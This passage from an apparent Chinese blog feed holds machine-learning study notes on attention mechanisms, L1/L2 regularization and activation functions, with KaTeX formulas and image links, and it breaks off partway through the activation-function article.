style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">Concat</span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">O</span></span></span></span></span></span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>是头数，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">head_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个头的注意力向量，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>W</mi><mi>O</mi></msup></mrow><annotation encoding="application/x-tex">W^O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">O</span></span></span></span></span></span></span></span></span></span></span>是一个可学习的权重矩阵，用于将所有头的注意力向量组合成最终的输出向量。</p><h2 id="4-自注意力"><strong>4. 自注意力</strong></h2><p>自注意力是一种注意力机制，它计算输入特征的加权和，其中权重基于输入本身进行学习。自注意力在语言建模任务中尤其有效，其中模型需要预测序列中的下一个单词。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Self-Attention</mtext><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>T</mi><mi>x</mi></msub></msubsup><msub><mi>α</mi><mi>i</mi></msub><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\text{Self-Attention} = \sum_{i=1}^{T_x} \alpha_i h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord text"><span class="mord">Self-Attention</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2809409999999999em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mi>x</mi></msub></mrow><annotation encoding="application/x-tex">T_x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是输入序列的长度，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个输入特征向量，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>α</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\alpha_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个特征向量的权重，由以下公式计算：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>α</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>T</mi><mi>x</mi></msub></msubsup><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>e</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\alpha_i = \frac{\exp(e_i)}{\sum_{j=1}^{T_x} \exp(e_j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.825845em;vertical-align:-0.8158449999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.506975em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97575em;"><span style="top:-2.177714285714286em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.987657142857143em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.23056em;"><span style="top:-2.3em;margin-left:-0.13889em;margin-right:0.1em;"><span class="pstrut" style="height:2.5em;"></span><span class="mord mathdefault mtight">x</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46117142857142857em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mop mtight">exp</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">exp</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8158449999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">e_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个特征向量的能量，由以下公式计算：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mo stretchy="false">(</mo><msub><mi>h</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_i = a(h_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>是一个可学习的函数，用于计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>与所有输入特征向量之间的相似度。</p><p>综上所述，注意力机制已成为深度学习模型中的重要工具，特别是在NLP任务中。软注意力、硬注意力、多头注意力和自注意力是在不同应用中使用的最流行的注意力机制类型。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attention </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则化</title>
      <link href="/2023/10/10/AILearning/DL/%E6%AD%A3%E5%88%99%E5%8C%96/"/>
      <url>/2023/10/10/AILearning/DL/%E6%AD%A3%E5%88%99%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="正则化">正则化</h2><ul><li>0 范数：向量中非零元素的个数</li><li>1 范数: 向量中各个元素绝对值之和。</li><li>2 范数: 向量中各个元素平方和的 1/2 次方，L2 范数又称 Euclidean 范数或者 Frobenius 范数</li><li>p 范数: 为 x 向量各个元素绝对值 p 次方和的 1/p 次方</li></ul><p>L1 和 L2 正则先验分别服从什么分布？L1 是拉普拉斯分布，L2 是高斯分布。</p><h3 id="为什么-l1-和-l2-正则化可以防止过拟合">为什么 L1 和 L2 正则化可以防止过拟合？</h3><ul><li>拟合过程中通常都<strong>倾向于让权值尽可能小</strong>，最后构造一个所有参数都比较小的模型。因为一般认为参数值小的模型比较简单，能适应不同的数据集，也在一定程度上避免了过拟合现象。可以设想一下对于一个线性回归方程，<strong>若参数很大，那么只要数据偏移一点点，就会对结果造成很大的影响</strong>；但如果参数足够小，数据偏移得多一点也不会对结果造成什么影响，即抗扰动能力强。</li><li>L1 &amp; L2 正则化会使模型偏好于更小的权值。更小的权值意味着更低的模型复杂度；**添加 L1 &amp; L2 正则化相当于为模型添加了某种先验，**限制了参数的分布，从而降低了模型的复杂度。</li><li>模型的复杂度降低，意味着模型对于<strong>噪声与异常点的抗干扰性的能力增强</strong>，从而提高模型的<strong>泛化能力</strong>。直观来说，<mark>就是对训练数据的拟合刚刚好，不会过分拟合训练数据（比如异常点，噪声）</mark></li></ul><h3 id="l1-与-l2-的相同点">L1 与 L2 的相同点</h3><blockquote><p>都可以限制模型的学习能力，即通过限制参数的规模，使模型偏好于权值较小的目标函数，防止过拟合。</p></blockquote><h3 id="l1-与-l2-的不同点">L1 与 L2 的不同点</h3><ul><li>L1 正则化可以产生<strong>更稀疏的权值矩阵</strong>，可以用于<strong>特征选择</strong>，同时<strong>一定程度上防止过拟合</strong>；L2 正则化主要用于防止模型过拟合;</li><li><strong>L1 正则化适用于特征之间有关联的情况；L2 正则化适用于特征之间没有关联的情况;</strong></li></ul><h3 id="l1-能使得权值稀疏">L1 能使得权值稀疏</h3><p>使用 0范数来正则化参数，也可以使大部分参数为0，实现稀疏，但是 0范数的优化求解特性不如 1 范数好，所以通常用 1 范数来实现稀疏。</p><p>L1 相对于 L2 更能实现权值稀疏，是由他们本身的计算方式决定的，L1 是各元素绝对值之和，L2 是各元素平方和的根，在对不同参数进行惩罚时，L1 无论参数大小如何，对它们的惩罚值都相同，导致那些参数大小和惩罚值相等的参数，一减就变为0，而 L2 对参数的惩罚值是根据参数本身的大小来变化的，越小的参数惩罚值越小，越大的参数惩罚值越大，所以最终使得所有参数都接近 0，但不会等于 0。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>激活函数</title>
      <link href="/2023/10/10/AILearning/DL/%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0_/"/>
      <url>/2023/10/10/AILearning/DL/%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0_/</url>
      
        <content type="html"><![CDATA[<blockquote><p>激活函数对神经网络的重要性自不必多言，机器之心也曾发布过一些相关的介绍文章，比如《<a href="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzA3MzI4MjgzMw%3D%3D%26mid%3D2650732724%26idx%3D4%26sn%3D5230b8bb1811cda38ab97afb417d1613%26chksm%3D871b3ccab06cb5dcdf0bdfadcc7ae85d8ae95588bed0b884a55ba50b76d541771104675fbb3e%26scene%3D21%23wechat_redirect">一文概览深度学习中的激活函数</a>》。本文同样关注的是激活函数。来自丹麦技术大学的 Casper Hansen 通过公式、图表和代码实验介绍了 sigmoid、ReLU、ELU 以及更新的 Leaky ReLU、SELU、GELU 这些激活函数，并比较了它们的优势和短板。</p></blockquote><p>选自mlfromscratch，作者：Casper Hansen，机器之心编译，参与：熊猫、杜伟。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036753.webp" alt="动图"></p><p>在计算每一层的激活值时，我们要用到激活函数，之后才能确定这些激活值究竟是多少。根据每一层前面的激活、权重和偏置，我们要为下一层的每个激活计算一个值。但在将该值发送给下一层之前，我们要使用一个激活函数对这个输出进行缩放。本文将介绍不同的激活函数。</p><p><strong>目录</strong></p><p>1.概述</p><p>2.sigmoid 函数是什么？</p><p>3.梯度问题：反向传播</p><ul><li>梯度消失问题</li><li>梯度爆炸问题</li><li>梯度爆炸的极端案例</li><li>避免梯度爆炸：梯度裁剪/范数</li></ul><p>4.整流线性单元（ReLU）</p><ul><li>死亡 ReLU：优势和缺点</li></ul><p>5.指数线性单元（ELU）</p><p>6.渗漏型整流线性单元（Leaky ReLU）</p><p>7.扩展型指数线性单元（SELU）</p><ul><li>SELU：归一化的特例</li><li>权重初始化+dropout</li></ul><p>8.高斯误差线性单元（GELU）</p><p>9.代码：深度神经网络的超参数搜索</p><p>10.扩展阅读：书籍与论文</p><h2 id="概述"><strong>概述</strong></h2><p>激活函数是神经网络中一个至关重要的部分。在这篇长文中，我将全面介绍六种不同的激活函数，并阐述它们各自的优缺点。我会给出激活函数的方程和微分方程，还会给出它们的图示。本文的目标是以简单的术语解释这些方程以及图。我会介绍梯度消失和爆炸问题；对于后者，我将按照 Nielsen 提出的那个很赞的示例来解释梯度爆炸的原因。最后，我还会提供一些代码让你可以自己在 Jupyter Notebook 中运行。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036751.jpg" alt="动图封面"></p><p>我会在 MNIST 数据集上进行一些小型代码实验，为每个激活函数都获得一张损失和准确度图。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036756.jpg" alt="img"></p><h2 id="sigmoid-函数是什么"><strong>sigmoid 函数是什么？</strong></h2><p>sigmoid 函数是一个 logistic 函数，意思就是说：不管输入是什么，得到的输出都在 0 到 1 之间。也就是说，你输入的每个神经元、节点或激活都会被缩放为一个介于 0 到 1 之间的值。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036760.jpg" alt="img"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036761.jpg" alt="img">sigmoid 函数图示。</p><p>sigmoid 这样的函数常被称为非线性函数，因为我们不能用线性的项来描述它。很多激活函数都是非线性或者线性和非线性的组合（有可能函数的一部分是线性的，但这种情况很少见）。这基本上没什么问题，但值恰好为 0 或 1 的时候除外（有时候确实会发生这种情况）。为什么这会有问题？这个问题与反向传播有关（有关反向传播的介绍请参阅我的前一篇文章）。在反向传播中，我们要计算每个权重的梯度，即针对每个权重的小更新。这样做的目的是优化整个网络中激活值的输出，使其能在输出层得到更好的结果，进而实现对成本函数的优化。在反向传播过程中，我们必须计算每个权重影响成本函数（cost function）的比例，具体做法是计算成本函数相对于每个权重的偏导数。假设我们不定义单个的权重，而是将最后一层 L 中的所有权重 w 定义为 w^L，则它们的导数为:</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036764.jpg" alt="img"></p><p>注意，当求偏导数时，我们要找到 ∂a^L 的方程，然后仅微分 ∂z^L，其余部分保持不变。我们用撇号「’」来表示任意函数的导数。当计算中间项 ∂a<sup>L/∂z</sup>L 的偏导数时，我们有：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036048.jpg" alt="img"></p><p>则 sigmoid 函数的导数就为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036059.jpg" alt="img"></p><p>当我们向这个 sigmoid 函数输入一个很大的 x 值（正或负）时，我们得到几乎为 0 的 y 值——也就是说，当我们输入 w×a+b 时，我们可能得到一个接近于 0 的值。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036074.jpg" alt="img">sigmoid 函数的导数图示。</p><p>当 x 是一个很大的值（正或负）时，我们本质上就是用一个几乎为 0 的值来乘这个偏导数的其余部分。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036086.jpg" alt="img"></p><p>如果有太多的权重都有这样很大的值，那么我们根本就没法得到可以调整权重的网络，这可是个大问题。如果我们不调整这些权重，那么网络就只有细微的更新，这样算法就不能随时间给网络带来多少改善。对于针对一个权重的偏导数的每个计算，我们都将其放入一个梯度向量中，而且我们将使用这个梯度向量来更新神经网络。可以想象，如果该梯度向量的所有值都接近 0，那么我们根本就无法真正更新任何东西。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036436.png" alt="img"></p><p>这里描述的就是梯度消失问题。这个问题使得 sigmoid 函数在神经网络中并不实用，我们应该使用后面介绍的其它激活函数。</p><h2 id="梯度问题"><strong>梯度问题</strong></h2><p><strong>梯度消失问题</strong></p><p>我的前一篇文章说过，如果我们想更新特定的权重，则更新规则为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036602.png" alt="img"></p><p>但如果偏导数 ∂C/∂w^(L) 很小，如同消失了一般，又该如何呢？这时我们就遇到了梯度消失问题，其中许多权重和偏置只能收到非常小的更新。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036999.jpg" alt="img"></p><p>可以看到，如果权重的值为 0.2，则当出现梯度消失问题时，这个值基本不会变化。因为这个权重分别连接了第一层和第二层的首个神经元，所以我们可以用</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036024.png" alt="img"></p><p>的表示方式将其记为</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036037.png" alt="img"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036050.png" alt="img"></p><p>假设这个权重的值为 0.2，给定一个学习率（具体多少不重要，这里使用了 0.5），则新的权重为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036060.png" 